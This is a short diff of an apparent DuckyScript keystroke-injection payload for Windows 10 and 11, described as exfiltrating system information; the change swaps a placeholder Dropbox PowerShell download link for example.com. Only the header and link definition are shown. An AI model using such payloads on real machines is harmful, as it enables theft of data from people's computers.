@@ -4,7 +4,7 @@ REM     Description: This payload exfiltrates Windows system information and ins
 REM     Target: Windows 10, 11
 
 REM     Replace DOWNLOAD_LINK with the actual download link of the script.
-DEFINE DOWNLOAD_LINK https://www.dropbox.com/s/xxxxxxxxxxxxxxx/.ps1?dl=1
+DEFINE DOWNLOAD_LINK example.com
 
 
 DELAY 2000
